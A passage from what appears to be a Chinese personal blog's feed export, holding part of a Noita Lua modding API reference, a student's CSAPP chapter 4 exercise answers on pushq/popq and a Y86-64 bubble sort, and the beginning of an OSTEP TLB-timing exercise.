<p>通过对周围四个样本点进行插值，提供更平滑的迷雾覆盖结果。用法同上</p>
<h3 id="GameSetFogOfWar"><a href="#GameSetFogOfWar" class="headerlink" title="GameSetFogOfWar"></a><code>GameSetFogOfWar</code></h3><blockquote>
<p>GameSetFogOfWar( pos_x:number, pos_y:number, fog_of_war:int ) -&gt; pos_valid:bool [‘fog_of_war’ should be between 0 and 255 (but will be clamped to the correct range with a int32-&gt;uint8 cast). Larger value means more coverage. Returns a boolean indicating whether or not the position was inside the bounds of the fog of war grid. For performance reasons consider using the components that manipulate fog of war.]</p>
</blockquote>
<p>设置战争之雾的值，输入坐标，值，0-255之间越大范围越大，超出255会被强制转化。返回一个bool值表示是否输入坐标在战争之雾格子范围内</p>
<h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><p>noita有一系列api辅助管理全局变量</p>
<h3 id="GameAddFlagRun"><a href="#GameAddFlagRun" class="headerlink" title="GameAddFlagRun"></a><code>GameAddFlagRun</code></h3><blockquote>
<p>GameAddFlagRun( flag:string )</p>
</blockquote>
<p>flag可以看做一个bool型全局变量，add即初始化/由false改为true</p>
<h3 id="GameRemoveFlagRun"><a href="#GameRemoveFlagRun" class="headerlink" title="GameRemoveFlagRun"></a><code>GameRemoveFlagRun</code></h3><blockquote>
<p>GameRemoveFlagRun( flag:string )</p>
</blockquote>
<p>移走flag，可以近似认为把该全局变量设置为false</p>
<h3 id="GameHasFlagRun"><a href="#GameHasFlagRun" class="headerlink" title="GameHasFlagRun"></a><code>GameHasFlagRun</code></h3><blockquote>
<p>GameHasFlagRun( flag:string ) -&gt; bool</p>
</blockquote>
<p>获取该“全局变量”的值</p>
<h3 id="GlobalsSetValue"><a href="#GlobalsSetValue" class="headerlink" title="GlobalsSetValue"></a><code>GlobalsSetValue</code></h3><blockquote>
<p>GlobalsSetValue( key:string, value:string )</p>
</blockquote>
<p>设置一个全局变量，输入变量名，值（字符串）</p>
<h3 id="GlobalsGetValue"><a href="#GlobalsGetValue" class="headerlink" title="GlobalsGetValue"></a><code>GlobalsGetValue</code></h3><blockquote>
<p>GlobalsGetValue( key:string, default_value:string = “” )</p>
</blockquote>
<p>获取一个全局变量的值，输入变量名，默认值（变量不存在时的返回值，字符串），返回字符串，<strong>获取数字需要加上tonumber</strong></p>
<h3 id="AddFlagPersistent"><a href="#AddFlagPersistent" class="headerlink" title="AddFlagPersistent"></a><code>AddFlagPersistent</code></h3><blockquote>
<p>AddFlagPersistent( key:string ) -&gt; bool_is_new</p>
</blockquote>
<p>输入字符串，增加一个永久flag，跨存档持久化的，游戏内用于各种进展</p>
<h3 id="HasFlagPersistent"><a href="#HasFlagPersistent" class="headerlink" title="HasFlagPersistent"></a><code>HasFlagPersistent</code></h3><blockquote>
<p>HasFlagPersistent( key:string ) -&gt; bool</p>
</blockquote>
<p>检查是否有某个永久flag</p>
<h3 id="RemoveFlagPersistent"><a href="#RemoveFlagPersistent" class="headerlink" title="RemoveFlagPersistent"></a><code>RemoveFlagPersistent</code></h3><blockquote>
<p>RemoveFlagPersistent( key:string )</p>
</blockquote>
<p>移除某个永久flag</p>
<h2 id="Camera"><a href="#Camera" class="headerlink" title="Camera"></a>Camera</h2><h3 id="GameGetCameraPos"><a href="#GameGetCameraPos" class="headerlink" title="GameGetCameraPos"></a><code>GameGetCameraPos</code></h3><blockquote>
<p>GameGetCameraPos() -&gt; x:number,y:number</p>
</blockquote>
<p>获取当前相机位置，返回坐标</p>
<h3 id="GameSetCameraPos"><a href="#GameSetCameraPos" class="headerlink" title="GameSetCameraPos"></a><code>GameSetCameraPos</code></h3><blockquote>
<p>GameSetCameraPos( x:number, y:number )</p>
</blockquote>
<p>设置镜头位置</p>
<h3 id="GameSetCameraFree"><a href="#GameSetCameraFree" class="headerlink" title="GameSetCameraFree"></a><code>GameSetCameraFree</code></h3><blockquote>
<p>GameSetCameraFree( is_free:bool )</p>
</blockquote>
<p>设置镜头自由与否（是否绑在米娜身上），自由后可以控制移动</p>
<h3 id="GameGetCameraBounds"><a href="#GameGetCameraBounds" class="headerlink" title="GameGetCameraBounds"></a><code>GameGetCameraBounds</code></h3><blockquote>
<p>GameGetCameraBounds() -&gt; x:number,y:number,w:number,h:number [Returns the camera rectangle. This may not be 100% pixel perfect with regards to what you see on the screen. ‘x’,’y’ = top left corner of the rectangle.]</p>
</blockquote>
<p>获取镜头边界，一个长方形，返回左上角坐标，宽、高</p>
<h2 id="混乱变形"><a href="#混乱变形" class="headerlink" title="混乱变形"></a>混乱变形</h2><p>游戏有一个混乱变形表，里面存着混乱变形效果生效的范围</p>
<h3 id="PolymorphTableAddEntity"><a href="#PolymorphTableAddEntity" class="headerlink" title="PolymorphTableAddEntity"></a><code>PolymorphTableAddEntity</code></h3><blockquote>
<p>PolymorphTableAddEntity( entity_xml:string, is_rare:bool = false, add_only_one_copy:bool = true ) [Adds the entity to the polymorph random table]</p>
</blockquote>
<p>往表里增加实体，参数为：xml路径名，两个bool变量，意义不明</p>
<h3 id="PolymorphTableRemoveEntity"><a href="#PolymorphTableRemoveEntity" class="headerlink" title="PolymorphTableRemoveEntity"></a><code>PolymorphTableRemoveEntity</code></h3><blockquote>
<p>PolymorphTableRemoveEntity( entity_xml:string, from_common_table:bool = true, from_rare_table:bool = true ) [Removes the entity from the polymorph random table]</p>
</blockquote>
<p>从表里移除实体，同上</p>
<h3 id="PolymorphTableGet"><a href="#PolymorphTableGet" class="headerlink" title="PolymorphTableGet"></a><code>PolymorphTableGet</code></h3><blockquote>
<p>PolymorphTableGet( bool rare_table = false ) -&gt; {string} [Returns a list of all the entities in the polymorph random table]</p>
</blockquote>
<p>获取表的信息，全部实体</p>
<h3 id="PolymorphTableSet"><a href="#PolymorphTableSet" class="headerlink" title="PolymorphTableSet"></a><code>PolymorphTableSet</code></h3><blockquote>
<p>PolymorphTableSet( {table_of_xml_entities}, bool rare_table = false ) [Set a list of all entities sas the polymorph random table]</p>
</blockquote>
<p>重新设置表，使用参考：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">function</span> <span class="token function">set_worm_only_polymorph</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">local</span> worm_entities <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"data/entities/animals/worm.xml"</span><span class="token punctuation">,</span>           <span class="token comment">-- 普通蠕虫</span>
<span class="token string">"data/entities/animals/worm_big.xml"</span><span class="token punctuation">,</span>       <span class="token comment">-- 大蠕虫</span>
<span class="token string">"data/entities/animals/worm_tiny.xml"</span><span class="token punctuation">,</span>      <span class="token comment">-- 小蠕虫</span>
<span class="token string">"data/entities/animals/worm_end.xml"</span><span class="token punctuation">,</span>       <span class="token comment">-- 地狱蠕虫</span>
<span class="token string">"data/entities/animals/worm_skull.xml"</span>      <span class="token comment">-- 幽灵蠕虫</span>
<span class="token punctuation">&#125;</span>

<span class="token function">PolymorphTableSet</span><span class="token punctuation">(</span>worm_entities<span class="token punctuation">,</span> <span class="token keyword">false</span><span class="token punctuation">)</span>
<span class="token function">PolymorphTableSet</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">true</span><span class="token punctuation">)</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="Herd（阵营）"><a href="#Herd（阵营）" class="headerlink" title="Herd（阵营）"></a>Herd（阵营）</h2><p>noita的生物都有一个阵营字段，详细可以参考<a href="https://noita.wiki.gg/zh/wiki/%E6%95%8C%E4%BA%BA%E9%98%B5%E8%90%A5">这里</a></p>
<h3 id="StringToHerdId"><a href="#StringToHerdId" class="headerlink" title="StringToHerdId"></a><code>StringToHerdId</code></h3><blockquote>
<p>StringToHerdId( herd_name:string  ) -&gt; int</p>
</blockquote>
<p>输入阵营字符串，返回阵营id</p>
<h3 id="HerdIdToString"><a href="#HerdIdToString" class="headerlink" title="HerdIdToString"></a><code>HerdIdToString</code></h3><blockquote>
<p>HerdIdToString( herd_id:int ) -&gt; string</p>
</blockquote>
<p>上一个的逆过程，输入id返回字符串</p>
<h3 id="GetHerdRelation"><a href="#GetHerdRelation" class="headerlink" title="GetHerdRelation"></a><code>GetHerdRelation</code></h3><blockquote>
<p>GetHerdRelation( herd_id_a:int, herd_id_b:int ) -&gt; number</p>
</blockquote>
<p>获取阵营关系，输入两个阵营id，返回一个数，越高越友善（可以直接去wiki查表的）</p>
<h3 id="EntityGetHerdRelation"><a href="#EntityGetHerdRelation" class="headerlink" title="EntityGetHerdRelation"></a><code>EntityGetHerdRelation</code></h3><blockquote>
<p>EntityGetHerdRelation( entity_a:int, entity_b:int ) -&gt; number</p>
</blockquote>
<p>输入两个实体id，返回友善程度（不被攻击的概率）</p>
<h3 id="EntityGetHerdRelationSafe"><a href="#EntityGetHerdRelationSafe" class="headerlink" title="EntityGetHerdRelationSafe"></a><code>EntityGetHerdRelationSafe</code></h3><blockquote>
<p>EntityGetHerdRelationSafe( entity_a:int, entity_b:int ) -&gt; number [does not spam errors, but returns 0 if anything fails]</p>
</blockquote>
<p>上一个函数的安全版本，指出错了返回0，其余一致</p>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><h3 id="GetParallelWorldPosition"><a href="#GetParallelWorldPosition" class="headerlink" title="GetParallelWorldPosition"></a><code>GetParallelWorldPosition</code></h3><blockquote>
<p>GetParallelWorldPosition( world_pos_x:number, world_pos_y:number ) -&gt; x, y [x = 0 normal world, -1 is first west world, +1 is first east world, if y &lt; 0 it is sky, if y &gt; 0 it is hell ]</p>
</blockquote>
<p>输入坐标，返回x,y。x表示平行世界值，0为主世界，-1为第一个西方向世界，1为第一个东方向世界，y<0表明在天堂，y>0表明在地狱</p>
<h3 id="IsPlayer"><a href="#IsPlayer" class="headerlink" title="IsPlayer"></a><code>IsPlayer</code></h3><blockquote>
<p>IsPlayer( entity_id:int ) -&gt; bool</p>
</blockquote>
<p>输入实体id，返回是否是玩家</p>
<h3 id="IsInvisible"><a href="#IsInvisible" class="headerlink" title="IsInvisible"></a><code>IsInvisible</code></h3><blockquote>
<p>IsInvisible( entity_id:int ) -&gt; bool</p>
</blockquote>
<p>输入实体id，返回是否不可见</p>
<h3 id="GameIsDailyRun"><a href="#GameIsDailyRun" class="headerlink" title="GameIsDailyRun"></a><code>GameIsDailyRun</code></h3><blockquote>
<p>GameIsDailyRun() -&gt; bool</p>
</blockquote>
<p>是否是每日挑战</p>
<h3 id="GameIsDailyRunOrDailyPracticeRun"><a href="#GameIsDailyRunOrDailyPracticeRun" class="headerlink" title="GameIsDailyRunOrDailyPracticeRun"></a><code>GameIsDailyRunOrDailyPracticeRun</code></h3><blockquote>
<p>GameIsDailyRunOrDailyPracticeRun() -&gt; bool</p>
</blockquote>
<p>是否是每日挑战或每日练习</p>
<h3 id="GameIsModeFullyDeterministic"><a href="#GameIsModeFullyDeterministic" class="headerlink" title="GameIsModeFullyDeterministic"></a><code>GameIsModeFullyDeterministic</code></h3><blockquote>
<p>GameIsModeFullyDeterministic() -&gt; bool</p>
</blockquote>
<p>游戏是否完全确定（有待进一步测试用法）</p>
<h3 id="dofile"><a href="#dofile" class="headerlink" title="dofile"></a><code>dofile</code></h3><blockquote>
<p>dofile( filename:string ) -&gt; (nil|script_return_type)|(nil,error_string) [Returns the script’s return value, if any. Returns nil,error_string if the script had errors.]</p>
</blockquote>
<p>输入一个文件，返回脚本的返回值，或nil</p>
<h3 id="dofile-once"><a href="#dofile-once" class="headerlink" title="dofile_once"></a><code>dofile_once</code></h3><blockquote>
<p>dofile_once( filename:string ) -&gt; (nil|script_return_type)|(nil,error_string) [Runs the script only once per lua context, returns the script’s return value, if any. Returns nil,error_string if the script had errors. For performance reasons it is recommended scripts use dofile_once(), unless the standard dofile behaviour is required.]</p>
</blockquote>
<p>同上，保证不重复执行脚本，用于替代dofile</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;&lt;span style = &quot;font-size: 30px; font-weight: 900&quot;&gt;一个 noita API使用参考文档 &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;noita的api只提供了参数和返回值，大多都没写具体效果，&lt;a</summary>
        
      
    
    
    
    <category term="noita" scheme="https://aucept.in/categories/noita/"/>
    
    
    <category term="lua" scheme="https://aucept.in/tags/lua/"/>
    
    <category term="noita" scheme="https://aucept.in/tags/noita/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP-第四章</title>
    <link href="https://aucept.in/2025/07/28/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0/"/>
    <id>https://aucept.in/2025/07/28/CSAPP-%E7%AC%AC%E5%9B%9B%E7%AB%A0/</id>
    <published>2025-07-28T04:50:13.000Z</published>
    <updated>2025-07-29T09:35:12.509Z</updated>
    
    <content type="html"><![CDATA[<h2 id="4-45"><a href="#4-45" class="headerlink" title="*4.45"></a><code>*4.45</code></h2><blockquote>
<p>在3.4.2节中，x86-64 pushq 指令被描述成要减少栈指针，然后将寄存器存储在栈指针的位置。因此，如果我们有一条指令形如对于某个寄存器 REG, pushq REG, 它等价千下面的代<br>码序列：<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">subq $8,%rsp  Decrement stack pointer
movq REG, (%rsp)  Store REG on stack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>A. 借助于练习题 4.7中所做的分析，这段代码序列正确地描述了指令 pushq %rsp 的行为吗？请解释。</p>
<p>B. 你该如何改写这段代码序列，使得它能够像对 REG 是其他寄存器时一样，正确地描述 REG 是%rsp 的情况？</p>
</blockquote>
<p>正常来说入栈是栈指针下移，把值放到栈上，但是pushq %rsp时，如果真的有这行代码，存的值是下移前还是后就产生了歧义。4.7告诉我们存的是没有减小的栈指针，所以题目所给的汇编代码是不正确的</p>
<p>修改的话：<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">movq REG, (%rsp-8)
subq $8,%rsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
<hr>
<h2 id="4-46"><a href="#4-46" class="headerlink" title="*4.46"></a><code>*4.46</code></h2><blockquote>
<p>3.4.2节中， x86-64 popq 指令被描述为将来自栈顶的结果复制到目的寄存器，然后将栈指针减少。因此，如果我们有一条指令形如 popq REG, 它等价于下面的代码序列：<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">&gt;movq (%rsp), REG    Read REG from stack
&gt;addq $8,%rsp        Increment stack pointer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>A. 借助于练习题 4.8 中所做的分析，这段代码序列正确地描述了指令 popq %rsp 的行为吗？请解释。</p>
<p>B. 你该如何改写这段代码序列，使得它能够像对 REG 是其他寄存器时一样，正确地描述 REG rsp 的情况？</p>
</blockquote>
<p>和上一题同理<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">movq REG, (%rsp+8)
addq $8,%rsp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
<hr>
<h2 id="4-47"><a href="#4-47" class="headerlink" title="***4.47"></a><code>***4.47</code></h2><blockquote>
<p>你的作业是写一个执行冒泡排序的 Y86-64 程序。下面这个函数用数组引用实现冒泡排序，供你参考：<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">></span><span class="token number">1</span> <span class="token operator">/</span>• Bubble sort<span class="token operator">:</span> Array version•<span class="token operator">/</span> 
<span class="token operator">></span><span class="token number">2</span> <span class="token keyword">void</span> <span class="token function">bubble_a</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token operator">*</span> data<span class="token punctuation">,</span> <span class="token keyword">long</span> count<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
<span class="token operator">></span><span class="token number">3</span>   <span class="token keyword">long</span> i<span class="token punctuation">,</span> last<span class="token punctuation">;</span> 
<span class="token operator">></span><span class="token number">4</span>   <span class="token keyword">for</span> <span class="token punctuation">(</span>last <span class="token operator">=</span> count<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> last <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> last<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
<span class="token operator">></span><span class="token number">5</span>       <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> O<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> last<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> 
<span class="token operator">></span><span class="token number">6</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span>data <span class="token punctuation">[</span>i <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> data <span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
<span class="token operator">></span><span class="token number">7</span>           <span class="token comment">/* Swap adjacent elements*/</span> 
<span class="token operator">></span><span class="token number">8</span>               <span class="token keyword">long</span> t <span class="token operator">=</span> data<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
<span class="token operator">></span><span class="token number">9</span>               data<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> 
<span class="token operator">></span><span class="token number">10</span>              data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> t<span class="token punctuation">;</span> 
<span class="token operator">></span><span class="token number">11</span>          <span class="token punctuation">&#125;</span>
<span class="token operator">></span><span class="token number">12</span>      <span class="token punctuation">&#125;</span>    
<span class="token operator">></span><span class="token number">13</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>A. 书写并测试一个版本，它用指针引用数组元素，而不是用数组索引。</p>
<p>B. 书写并测试一个由这个函数和测试代码组成的 Y86-64 程序。你会发现模仿编译你的代码产生的 x86-64 代码来做实现会很有帮助。虽然指针比较通常是用无符号算术运算来实现的，但是在这个练习中，你可以使用有符号算术运算。</p>
</blockquote>
<p>用指针做一个替换<br><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">bubble_a</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token operator">*</span> data<span class="token punctuation">,</span> <span class="token keyword">long</span> count<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">long</span> i<span class="token punctuation">,</span> last<span class="token punctuation">;</span>
  <span class="token keyword">long</span> <span class="token operator">*</span>p <span class="token operator">=</span> data<span class="token punctuation">;</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span>last <span class="token operator">=</span> count<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> last <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> last<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> last<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token keyword">long</span> <span class="token operator">*</span>a <span class="token operator">=</span> data <span class="token operator">+</span> i<span class="token punctuation">;</span>
      <span class="token keyword">long</span> <span class="token operator">*</span>b <span class="token operator">=</span> data <span class="token operator">+</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">*</span>a <span class="token operator">></span> <span class="token operator">*</span>b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">long</span> t <span class="token operator">=</span> <span class="token operator">*</span>a<span class="token punctuation">;</span>
        <span class="token operator">*</span>a <span class="token operator">=</span> <span class="token operator">*</span>b<span class="token punctuation">;</span>
        <span class="token operator">*</span>b <span class="token operator">=</span> t<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>得到的x86代码如下：<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">bubble_a:
.LFB23:
.cfi_startproc
endbr64
leaq-1(%rsi), %r8   ;last &#x3D; count-1
testq%r8, %r8
jle.L1
leaq(%rdi,%r8,8), %rsi  ;rsi &#x3D; rdi + 8 * r8
jmp.L3
.L4:
addq$8, %rax        ; 指向下一个元素
cmpq%rsi, %rax      ; 确认是否遍历完毕
je.L7                 ; 遍历完，进入L7，否则进入L5
.L5:
movq(%rax), %rdx
movq8(%rax), %rcx
cmpq%rcx, %rdx      ; 比较当前元素和下一个元素
jle.L4                 ; 跳到L4，下一次循环
movq%rcx, (%rax)    
movq%rdx, 8(%rax)   ; 交换
jmp.L4                 
.L7:
subq$8, %rsi        
subq$1, %r8
je.L1
.L3:
movq%rdi, %rax      ;把数组的起始地址放入 %rax
jmp.L5
.L1:
ret
.cfi_endproc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>转译到Y86代码</p>
<p>回顾Y86指令，只有8字节数据。<br>有指明目标的4个movq：irmovq rrmovq mrmovq rmmovq，立即数(i)、寄存器 (r) 或内存 (m).<br>四个只能操作寄存器的整数操作addq subq andq xorq<br>七个跳转指令jmp jle jl je jne jge jg<br>六个条件传送cmovle cmovl cmove cmovne cmovge cmovg<br>call ret<br>pushq popq<br>halt停止处理器</p>
<p>接下来对照x86汇编代码完成翻译：<br><pre class="line-numbers language-x86asm" data-language="x86asm"><code class="language-x86asm">bubble_a:
    irmovq  $1, %rax     ;rax &#x3D; 1，立即数
    rrmovq  %rsi, %r8    ;r8 &#x3D; count
    subq    %rbx, %r8    ; count - 1
    jle .L1              ;last小于0，进入.L1（返回）
    irmovq $8,  %rbx     ;rbx &#x3D; 8
    rrmovq  %r8, %rcx    ;rcx &#x3D; last
    andq    %rcx,%rcx    
    jle .L1              ;如果只有一个元素，也返回
    
    irmovq  $0, %rsi     ;rsi &#x3D; 0
    
.L_mult:
    addq    %rbx, %rsi   ;rsi +&#x3D; 8
    subq    %rbx, %rcx   ;rcx -&#x3D; 1  
    jg .L_mult           ;rcx 小于等于0时
    addq    %rdi, %rsi   ;rsi &#x3D; data + last*8，完成寻址
    
.L3:
    rrmovq  %rdi, %rax   ;rax &#x3D; data
    jmp .L5
.L5:
    mrmovq  (%rax), %rdx
    mrmovq  8(%rax), %rcx ;拿出两个待比较数字
    rrmovq  %rdx, %rbx  ;中继，不影响寄存器里的值
    subq    %rcx, %rbx  ;比较
    jle .L4
    rmmovq  %rcx, (%rax)
    rmmovq  %rdx, 8(%rax) ;交换
    
.L4:
    irmovq  $8, %rbx
    addq    %rbx, %rax  ;指向下一个元素
    rrmovq  %rsi, %rbx
    subq    %rax, %rbx  
    je .L7              ;内层循环结束，进入外层循环
    jmp .L5             ;继续内层循环
.L7:
    irmovq  $8, %rbx    ;rbx &#x3D; 8
    subq    %rbx, %rsi  ;rsi -&#x3D; 8
    irmovq  $1, %rbx    ;rbx &#x3D; 1
    subq    %rbx, %r8   ;r8(last)-&#x3D;1
    je .L1              ;last &#x3D;&#x3D; 0,返回
    jmp .L3             ;否则回到L3
.L1:
    ret                 ;返回<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;4-45&quot;&gt;&lt;a href=&quot;#4-45&quot; class=&quot;headerlink&quot; title=&quot;*4.45&quot;&gt;&lt;/a&gt;&lt;code&gt;*4.45&lt;/code&gt;&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;在3.4.2节中，x86-64 pushq</summary>
        
      
    
    
    
    
    <category term="CSAPP" scheme="https://aucept.in/tags/CSAPP/"/>
    
    <category term="Y86" scheme="https://aucept.in/tags/Y86/"/>
    
  </entry>
  
  <entry>
    <title>OSTEP-第十九章</title>
    <link href="https://aucept.in/2025/07/11/OSTEP-%E7%AC%AC%E5%8D%81%E4%B9%9D%E7%AB%A0/"/>
    <id>https://aucept.in/2025/07/11/OSTEP-%E7%AC%AC%E5%8D%81%E4%B9%9D%E7%AB%A0/</id>
    <published>2025-07-11T00:55:59.000Z</published>
    <updated>2025-07-11T04:33:51.074Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>本次作业要测算一下 TLB 的容量和访问 TLB 的开销。这个想法参考了 Saavedra-Barrera 的工作[SB92]，他设计了一个简单而漂亮的用户级程序，来测算缓存层级结构的方方面面。更多细节请阅读他的论文。</p>
<p>基本原理就是访问一个跨多个内存页的大尺寸数据结构（例如数组），然后统计访问时间。例如，假设一个机器的 TLB 大小为 4（这很小，但对这个讨论有用）。如果写一个程序访问 4 个或更少的页，每次访问都会命中 TLB，因此相对较快。但是，如果在一个循环里反复访问 5 个或者更多的页，每次访问的开销就会突然跃升，因为发生 TLB 未命中。</p>
<p><strong>问题</strong>：</p>
<ul>
<li>为了计时，可能需要一个计时器，例如gettimeofday()提供的。这种计时器的精度如何？操作要花多少时间，才能让你对它精确计时？</li>
<li>写一个程序，命名为tlb.c，大体测算一下每个页的平均访问时间。程序的输入参数有：页的数目和尝试的次数</li>
<li>用你喜欢的脚本语言写一段脚本来运行这个程序，当访问量从1增长到几千，也许每次迭代都乘2。在不同的机器上运行这段脚本，同时收集相应的数据。需要试多少次才能获得可信的测量结果？</li>
<li>接下来将结果绘图</li>
<li>要注意编译器优化带来的影响。编译器做各种聪明的事情，包括优化掉循环，如果循环中增加的变量后续没有使用，如何确保编译器不优化掉你写的TLB大小测算程序的主循环</li>
<li>还有一个需要注意的地方，今天的计算机系统大多有多个CPU，每个CPU当然有自己的TLB结构。为了得到准确的测量数据，我们只需要在一个CPU上运行程序，避免调度器把进程从一个CPU调度到另一个去运行。如何做到？（提示，在Google上搜索“pinning a thread”相关的信息）如果没有这样做，代码从一个CPU移到了另一个，会发生什么情况？</li>
<li>另一个可能发生的问题与初始化相关。如果在访问数组a之前没有初始化，第一次访问将非常耗时，由于初始访问开销，比如要求置0。这会影响你的代码及其计时吗？如何抵消这些潜在的开销？</li>
</ul>
</blockquote>
<p>先考虑一下可能遇到的这些问题：对于计时，第六章的作业已经接触过，可以用rdtsc系统调用。脚本语言自然是我最熟悉的lua了，对于计时，也许可以继续使用C的系统调用，绘图有些麻烦，可能不像py那样方便。编译器的优化问题，可以在编译时指定-O0，查看汇编代码是否有不必要的优化。CPU调度的话，pin指令已经不陌生了。初始化问题，如果没有初始化，因为很多操作都是lazy的，访问时才分配物理内存，建立映射，就增加了额外的延迟</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;x86intrin.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">N</span> <span class="token expression"><span class="token number">1000</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PAGES</span> <span class="token expression"><span class="token number">1000</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAX</span> <span class="token expression"><span class="token number">17</span></span></span>

<span class="token keyword">int</span> a<span class="token punctuation">[</span>PAGES <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>MAX<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// +1好习惯</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> PAGES <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>MAX<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//初始化</span>
